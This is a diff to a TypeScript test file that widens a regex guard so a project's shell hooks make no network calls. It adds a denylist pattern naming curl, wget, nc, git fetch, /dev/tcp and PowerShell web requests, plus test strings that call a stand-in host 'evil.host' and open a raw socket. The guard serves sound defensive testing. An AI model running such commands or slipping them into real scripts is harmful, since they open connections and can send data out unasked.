@@ -1,8 +1,8 @@
 import { describe, expect, test } from "bun:test";
-import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
+import { mkdtempSync, mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { join } from "node:path";
-import { execFileSync, spawnSync } from "node:child_process";
+import { basename, join } from "node:path";
+import { spawnSync } from "node:child_process";
 
 /* ============================================================
    FORK / MIRROR ORIGIN DETECTION (2026-07-28)
@@ -259,12 +259,42 @@ describe("flowy_origin_slug_for (reads .git/config, no network)", () => {
   });
 });
 
-/** Matches a network command as INVOKED (command position + word boundary), never a substring. */
-const NETWORK_CMD = /(^|[;&|(\s])(curl|wget|nc|ping|telnet|ssh|scp|ftp)\s/m;
+/**
+ * Matches a network command as INVOKED (command position + word boundary),
+ * never a substring.
+ *
+ * D1 widened this from seven bare command names. Each addition is an evasion
+ * that was measured walking through the old pattern, not a hypothetical:
+ * `git ls-remote`/`fetch`/`clone`/`push`/`pull` (git is a network client and
+ * "git" alone was not on the list), `/dev/tcp/` (bash opens a socket with no
+ * command at all), the two PowerShell verbs, and a bare `fetch(` for the
+ * `node -e` route.
+ *
+ * It is still a FLOOR, not a proof. Nothing here catches an interpreter
+ * invocation somebody works to obscure, and PROVENANCE.md now says so instead
+ * of implying the test settles the question.
+ */
+const NETWORK_CMD =
+  /(^|[;&|(\s])(curl|wget|nc|ping|telnet|ssh|scp|ftp|git\s+(ls-remote|fetch|clone|push|pull))\s|\/dev\/tcp\/|Invoke-WebRequest|Invoke-RestMethod|\bfetch\s*\(/m;
 const HELPER_SOURCE = "#!/usr/bin/env sh\nflowy_noop() { :; }";
 
+const HOOKS_DIR = join(import.meta.dir, "..", "hooks");
+
+/**
+ * Every shell the engine runs, DERIVED from the directory rather than listed.
+ *
+ * The old scan read one file, `flowy-origin.sh`, and never read
+ * `flowy-inject.sh` where the notice is actually emitted. A hardcoded list
+ * drifts on the next hook somebody adds, and the file most worth scanning is
+ * the one nobody remembered to add. Same lesson as the override scan, which
+ * drifted twice before its set was derived from its allowlist.
+ */
+const SCANNED = readdirSync(HOOKS_DIR)
+  .filter((f) => f.endsWith(".sh"))
+  .map((f) => join(HOOKS_DIR, f));
+
 describe("no network", () => {
-  test("the helper contains no network-capable command", () => {
+  test("no scanned hook contains a network-capable command", () => {
     // The rule is worth a test, not just a comment. If someone later "improves"
     // detection by querying a remote API, this fails and says why.
     //
@@ -275,9 +305,48 @@ describe("no network", () => {
     // scans source for a forbidden thing must match how the thing is INVOKED
     // (word boundary, command position), never a bare substring. A guard that
     // cries wolf on a comment gets deleted, and then it guards nothing.
-    const src = execFileSync("cat", [HELPER], { encoding: "utf8" });
-    expect(src).not.toMatch(NETWORK_CMD);
-    expect(src).not.toContain("api.github.com");
+    for (const f of SCANNED) {
+      const src = readFileSync(f, "utf8");
+      expect(src).not.toMatch(NETWORK_CMD);
+      expect(src).not.toContain("api.github.com");
+    }
+  });
+
+  /* --------------------------------------------------------------------
+     D1 (2026-07-28). PROVENANCE.md says "It never phones home. No request
+     leaves your machine, ever", and cites this guard as what backs it. The
+     guard was one file against seven command names, and every one of the
+     evasions below walked straight through it. It also never read
+     flowy-inject.sh, which is where the notice is actually EMITTED, so
+     the half of the mechanism that writes to the user was unscanned.
+     -------------------------------------------------------------------- */
+
+  test("the scan covers EVERY shell the engine runs, derived not listed", () => {
+    // DERIVE THE SET, DO NOT HARDCODE IT. A hardcoded list drifts the moment
+    // somebody adds a hook, and the file most worth scanning is the one
+    // nobody remembered to add. The directory is the source of truth.
+    const onDisk = readdirSync(HOOKS_DIR)
+      .filter((f) => f.endsWith(".sh"))
+      .sort();
+    expect(SCANNED.map((p) => basename(p)).sort()).toEqual(onDisk);
+    // Named explicitly because it is the specific omission D1 found.
+    expect(SCANNED.map((p) => basename(p))).toContain("flowy-inject.sh");
+  });
+
+  test("the guard catches what a seven-name denylist missed", () => {
+    // Each of these was verified to pass the old guard before it was widened.
+    // A denylist is a floor, never a proof, and a floor with holes this
+    // obvious is not even a floor.
+    for (const evasion of [
+      "_x=$(git ls-remote https://evil.host/r 2>/dev/null)",
+      "git fetch --quiet origin",
+      "exec 3<>/dev/tcp/1.2.3.4/80",
+      "Invoke-WebRequest -Uri https://evil.host",
+      "Invoke-RestMethod https://evil.host",
+      'node -e "fetch(String.raw`https://evil.host`)"',
+    ]) {
+      expect(`${HELPER_SOURCE}\n${evasion}\n`).toMatch(NETWORK_CMD);
+    }
   });
 
   test("the network guard actually catches a network call", () => {
@@ -292,5 +361,11 @@ describe("no network", () => {
     // "shipping" contains "ping". This is the exact false positive that made
     // the first version of the guard fail on its own header comment.
     expect("# shipping this is fine, encoding and truncating too\n").not.toMatch(NETWORK_CMD);
+    // The widened pattern adds more surface to get this wrong on. `.git/config`
+    // and "a git clone" appear in these files' own prose; only an INVOKED
+    // subcommand may match.
+    expect("# reads the marketplace clone's .git/config, locally\n").not.toMatch(NETWORK_CMD);
+    expect("# not a git repository at all: say nothing\n").not.toMatch(NETWORK_CMD);
+    expect("_dest=$(prefetch_dir)\n").not.toMatch(NETWORK_CMD);
   });
 });
